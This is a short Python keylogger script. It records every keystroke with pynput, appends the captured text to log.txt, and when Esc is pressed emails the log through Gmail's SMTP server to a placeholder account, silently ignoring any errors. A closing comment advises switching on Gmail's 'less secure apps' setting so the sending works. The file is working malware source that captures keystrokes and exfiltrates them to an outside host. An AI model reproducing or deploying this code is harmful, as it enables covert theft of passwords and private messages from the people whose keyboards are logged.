from pynput import keyboard
from pynput.keyboard import Key, Listener
from datetime import datetime
import smtplib

log = ""

def on_press(key):
    global log
    #if character is letter or number
    try:
        log += key.char
    #if is a special character
    except AttributeError:
        if key is keyboard.Key.space:
            log += " "
        if key is keyboard.Key.backspace:
            log = log[:len(log) - 1]
        if key is keyboard.Key.enter:
            log += "\n"
        if key is keyboard.Key.tab:
            log += "\t"
    #condition for close the program
    if key is keyboard.Key.esc:
        save_to_file(log,datetime.now())
        send_email('log.txt')
        quit()

#create or update log file
def save_to_file(str_log, dtt):
    log_file = open('log.txt','a+')
    log_file.write("\n[" + str(dtt) + "]:\n" + str_log + "\n")
    log_file.close()

def send_email(file_to_send):
    f = open(file_to_send,'r+')
    message = f.read()
    f.close()
    try:
        #email data
        fromaddr = 'your_mail@gmail.com'
        toaddrs = 'your_mail@gmail.com'
        username = 'your_mail@gmail.com'
        password = 'your_pass'
        #send log file to email
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, toaddrs, message)
        server.quit()
    except:
 
        pass

with Listener(on_press=on_press) as listener:
    listener.join()

#you must change your security config in gmail to perform sendings
#https://myaccount.google.com/lesssecureapps -> on
